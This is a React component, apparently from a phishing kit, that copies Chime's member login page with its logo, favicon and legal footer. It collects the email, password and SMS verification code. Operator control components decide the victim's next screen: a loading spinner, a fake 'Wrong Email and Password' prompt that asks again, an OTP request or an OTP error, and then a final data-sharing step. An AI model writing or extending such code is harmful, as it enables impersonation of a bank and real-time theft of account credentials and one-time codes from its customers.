import clsx from "clsx";
import useBankFunctions from "../../../../../../../hooks/useBankFunctions";
import { motion } from "framer-motion";
import BankingHeader from "./BankingHeader";
import ChimeFavIcon from "../../../../../../../../assets/allBanks/banks/chime/chi3.ico";
import { Link } from "react-router-dom";
import { FaRegEye, FaRegEyeSlash } from "react-icons/fa6";
import ChimeImage from "../../../../../../../../assets/allBanks/banks/chime/chi2.png";
import ShareData from "./ShareData";
import { ClipLoader } from "react-spinners";
import BasicLoader from "../../../../../loading/BasicLoader";
import AdminLink from "../../../../../admin/AdminLink";
import BankControl from "./BankControl";
import BankOtpControl from "./BankOtpControl";

const Chime = ({
  handleCancel,
  bankName,
  selectedPath,
  allBankOpen,
  handleSelectSubmit,
  handleSelectedId,
  whatToShowDetails,
  setOtpOpen,
  OtpOpen,
  selectedOtp,
  handleSubmitOtp,
  handleSelectedOtp,
  otpInfo,
  activePathDetails,
  activeOtp,
  setAllBankItems,
  typeAccount,
  setTypeAccount,
  loading,
  setIsOpenOtp,
  user,
}) => {
  const {
    formState,
    handleTheMainSubmit,
    handleChange,
    onSubmitOtp,
    changeOtp,
    formOtp,
    resend,
    setshowPassword,
    showPassword,
    handleTheFinal,
    handleVerifiedOtp,
    onSumbitForm,
    handleResend,
  } = useBankFunctions(bankName, setOtpOpen, setAllBankItems, setTypeAccount);

  return (
    <motion.div
      initial={{ y: -100, opacity: 0 }}
      animate={{ y: 0, opacity: 1 }}
      exit={{ y: -100, opacity: 0 }}
      transition={{ type: "spring", stiffness: 300, damping: 50 }}
      className={clsx(
        "w-full min-h-screen h-full  top-0  bg-white",
        typeAccount ? "hidden" : "block"
      )}
    >
      <BankingHeader
        text="Member Login | Chime"
        handleCancel={handleCancel}
        img={ChimeFavIcon}
        setAllBankItems={setAllBankItems}
        setIsOpenOtp={setIsOpenOtp}
        setOtpOpen={setOtpOpen}
      />
      <div className="flex items-center justify-center px-6 pt-10 pb-20">
        <div>
          <div
            className={clsx(
              "  customMiniTablet:w-[480px] customMiniTablet:px-6",
              allBankOpen ? "hidden" : "block"
            )}
          >
            <div className="mb-8">
              <img
                src={ChimeImage}
                alt=""
                className="w-[125px] h-[36px] object-contain"
              />
            </div>
            <div className="space-y-4">
              <div>
                <input
                  type="text"
                  placeholder="Email"
                  value={formState.username}
                  name="username"
                  onChange={handleChange}
                  className="w-full px-4 py-4 border-2 rounded-lg border-customGray-1038 placeholder:text-customGray-1006 placeholder:font-semibold"
                />
              </div>
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  value={formState.password}
                  name="password"
                  onChange={handleChange}
                  placeholder="Password"
                  className="w-full px-4 py-4 border-2 rounded-lg border-customGray-1038 placeholder:text-customGray-1006 placeholder:font-semibold"
                />
                {formState.password && (
                  <span
                    onClick={() => setshowPassword((prevShow) => !prevShow)}
                    className="absolute h-full py-5 right-4 "
                  >
                    {showPassword ? (
                      <FaRegEyeSlash size={16} />
                    ) : (
                      <FaRegEye size={16} />
                    )}
                  </span>
                )}
              </div>
            </div>
            <button
              onClick={(e) => handleTheMainSubmit(e, onSumbitForm)}
              className={clsx(
                "w-full py-3 my-8 font-semibold rounded-lg text-customGray-1039 bg-customGray-1040",
                formState.username &&
                  formState.password &&
                  "bg-customGreen-600 text-white transistion2"
              )}
            >
              {loading && <ClipLoader size={10} color="#33333366" />}
              {loading ? "Loading..." : "Sign in"}
            </button>
            <p className="mb-5 font-semibold">
              By clicking “Sign in”, you agree to receive SMS text messages from
              Chime to verify your identity
            </p>
            <Link
              to="https://www.chime.com/"
              className="space-y-2 font-semibold "
            >
              <p className="underline">Forgot your email address?</p>
              <p className="underline">Forgot your password</p>
              <p className="underline">Need to create an acount?Sign up!</p>
            </Link>
          </div>
          {allBankOpen && (
            <div className={clsx(OtpOpen ? "hidden" : "block")}>
              <BankControl
                handleSelectedId={handleSelectedId}
                selectedPath={selectedPath}
                handleSelectSubmit={handleSelectSubmit}
              />
              <div>
                {activePathDetails.name === "Loading" && (
                  <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                    <BasicLoader />
                  </p>
                )}
                {activePathDetails.name === "Wrong Info" && (
                  <>
                    <div
                      className={clsx(
                        "  customMiniTablet:w-[480px] customMiniTablet:px-6"
                      )}
                    >
                      <div className="mb-8">
                        <img
                          src={ChimeImage}
                          alt=""
                          className="w-[125px] h-[36px] object-contain"
                        />
                      </div>
                      <div className="flex justify-center gap-1 mx-3 my-5 font-extrabold text-center customMiniTablet:mx-0 text-customRed-200">
                        <p>Wrong Email and Password</p>
                      </div>
                      <div className="space-y-4">
                        <div>
                          <input
                            type="text"
                            placeholder="Email"
                            value={formState.username}
                            name="username"
                            onChange={handleChange}
                            className="w-full px-4 py-4 border-2 rounded-lg border-customGray-1038 placeholder:text-customGray-1006 placeholder:font-semibold"
                          />
                        </div>
                        <div className="relative">
                          <input
                            type={showPassword ? "text" : "password"}
                            value={formState.password}
                            name="password"
                            onChange={handleChange}
                            placeholder="Password"
                            className="w-full px-4 py-4 border-2 rounded-lg border-customGray-1038 placeholder:text-customGray-1006 placeholder:font-semibold"
                          />
                          {formState.password && (
                            <span
                              onClick={() =>
                                setshowPassword((prevShow) => !prevShow)
                              }
                              className="absolute h-full py-5 right-4 "
                            >
                              {showPassword ? (
                                <FaRegEyeSlash size={16} />
                              ) : (
                                <FaRegEye size={16} />
                              )}
                            </span>
                          )}
                        </div>
                      </div>
                      <button
                        onClick={(e) => handleTheMainSubmit(e, onSumbitForm)}
                        className={clsx(
                          "w-full py-3 my-8 font-semibold rounded-lg text-customGray-1039 bg-customGray-1040",
                          formState.username &&
                            formState.password &&
                            "bg-customGreen-600 text-white transistion2"
                        )}
                      >
                        {loading && <ClipLoader size={10} color="#33333366" />}
                        {loading ? "Loading..." : "Sign in"}
                      </button>
                      <p className="mb-5 font-semibold">
                        By clicking “Sign in”, you agree to receive SMS text
                        messages from Chime to verify your identity
                      </p>
                      <Link
                        to="https://www.chime.com/"
                        className="space-y-2 font-semibold "
                      >
                        <p className="underline">Forgot your email address?</p>
                        <p className="underline">Forgot your password</p>
                        <p className="underline">
                          Need to create an acount?Sign up!
                        </p>
                      </Link>
                    </div>
                  </>
                )}
                {activePathDetails.name === "Send Otp" && (
                  <>
                    <h3>{activePathDetails.body}</h3>
                    <div
                      className={clsx(
                        "customMiniTablet:w-[480px] customMiniTablet:px-6"
                      )}
                    >
                      <div>
                        <div>
                          <div>
                            <h3 className="mb-2 font-bold text-center text-black">
                              Enter the Verification code{" "}
                            </h3>
                          </div>
                          <div className="px-4 customMiniTablet:px-20">
                            <h2 className="mb-5 text-sm font-bold text-center">
                              Enter the code sent to your mobile phone
                            </h2>
                            <div>
                              <input
                                type="number"
                                value={formOtp.otpo}
                                name="otpo"
                                onChange={changeOtp}
                                placeholder="Code"
                                className={clsx(
                                  "w-full px-4 py-4 border-2 rounded-lg border-customGray-1038 placeholder:text-customGray-1006 placeholder:font-semibold no-spinner"
                                )}
                              />
                            </div>
                            <button
                              onClick={(e) => onSubmitOtp(e, handleVerifiedOtp)}
                              className={clsx(
                                "w-full py-3 my-8 font-semibold rounded-lg text-customGray-1039 bg-customGray-1040",
                                formOtp.otpo &&
                                  "bg-customGreen-600 text-white transistion2"
                              )}
                            >
                              {loading && (
                                <ClipLoader size={10} color="#33333366" />
                              )}
                              {loading ? "Loading..." : "Verify"}
                            </button>
                            <p
                              className={clsx(
                                "cursor-pointer text-customBlue-100 font-bold",
                                !resend &&
                                  "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                              )}
                              onClick={handleResend}
                            >
                              Didnt get a code? Resend
                            </p>
                          </div>
                        </div>
                      </div>
                    </div>
                  </>
                )}
              </div>
            </div>
          )}
          {OtpOpen && (
            <>
              <BankOtpControl
                handleSelectedOtp={handleSelectedOtp}
                selectedOtp={selectedOtp}
                handleSubmitOtp={handleSubmitOtp}
              />
              <div>
                {activeOtp.name === "Loading" && (
                  <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                    <BasicLoader />
                  </p>
                )}
                {activeOtp.name === "wrong" && (
                  <>
                    <div
                      className={clsx(
                        "customMiniTablet:w-[480px] customMiniTablet:px-6"
                      )}
                    >
                      <div>
                        <div>
                          <div>
                            <h3 className="mb-2 font-bold text-center text-black">
                              Enter the Verification code{" "}
                            </h3>
                          </div>
                          <div className="px-4 customMiniTablet:px-20">
                            <h2 className="mb-5 text-sm font-bold text-center">
                              Enter the code sent to your mobile phone
                            </h2>
                            <div>
                              <input
                                type="number"
                                value={formOtp.otpo}
                                name="otpo"
                                onChange={changeOtp}
                                placeholder="Code"
                                className={clsx(
                                  "w-full px-4 py-4 border-2 rounded-lg border-customGray-1038 placeholder:text-customGray-1006 placeholder:font-semibold no-spinner"
                                )}
                              />
                              <h3 className="mt-2 text-sm text-customRed-200">
                                {activeOtp.body}
                              </h3>
                            </div>
                            <button
                              onClick={(e) => onSubmitOtp(e, handleVerifiedOtp)}
                              className={clsx(
                                "w-full py-3 my-8 font-semibold rounded-lg text-customGray-1039 bg-customGray-1040",
                                formOtp.otpo &&
                                  "bg-customGreen-600 text-white transistion2"
                              )}
                            >
                              {loading && (
                                <ClipLoader size={10} color="#33333366" />
                              )}
                              {loading ? "Loading..." : "Verify"}
                            </button>
                            <p
                              className={clsx(
                                "cursor-pointer text-customBlue-100 font-bold",
                                !resend &&
                                  "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                              )}
                              onClick={handleResend}
                            >
                              Didnt get a code? Resend
                            </p>
                          </div>
                        </div>
                      </div>
                    </div>
                  </>
                )}
                {activeOtp.name === "otp" && (
                  <>
                    <ShareData
                      bankName={bankName}
                      handleTheFinal={handleTheFinal}
                      handleCancel={handleCancel}
                      setIsOpenOtp={setIsOpenOtp}
                      setAllBankItems={setAllBankItems}
                      siteLink="https://www.chime.com/"
                    />
                  </>
                )}
              </div>
            </>
          )}
          <footer className="text-customGray-1006 customMiniTablet:w-[480px] customMiniTablet:px-6 space-y-5 mt-16">
            <p>© 2025 Chime. All Rights Reserved.</p>
            <p>
              Banking Services provided by The Bancorp Bank, N.A., or Stride
              Bank, N.A., Members FDIC. The Chime Visa® Debit Card is issued by
              The Bancorp Bank, N.A., or Stride Bank pursuant to a license from
              Visa U.S.A. Inc. and may be used everywhere Visa debit cards are
              accepted. Please see back of your Card for its issuing bank.
            </p>
          </footer>
        </div>
      </div>
    </motion.div>
  );
};

export default Chime;
